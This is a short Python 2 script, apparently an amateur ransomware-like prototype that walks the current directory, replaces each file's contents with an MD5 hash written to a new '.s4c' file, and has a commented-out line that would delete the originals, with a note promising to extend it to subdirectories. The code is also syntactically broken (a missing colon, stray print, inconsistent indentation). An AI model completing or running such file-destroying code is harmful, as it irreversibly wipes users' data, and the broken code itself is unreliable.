import hashlib,os




print 
files=os.listdir(os.getcwd()) #get current directory file list
for f in files: #for each file
        
    if "." not in f:
                   print "its a dir" # i will update to crypt also inside other directories
    if "s4cl" in f
        print "don't do it pls"
                     
    elif "." in f: #get hashed xD
                   fr= open(f,"r")
                   data=fr.read()
                   fr.close()
                   print f
                  # os.remove(f)
                   fo= open(f+"s4c","w")
                   data_s4c=hashlib.md5(data).hexdigest() #dati cryptati
                   fo.write(data_s4c)
                   fo.close()
                   print data_s4c+"done \n"
                   
                   
                   
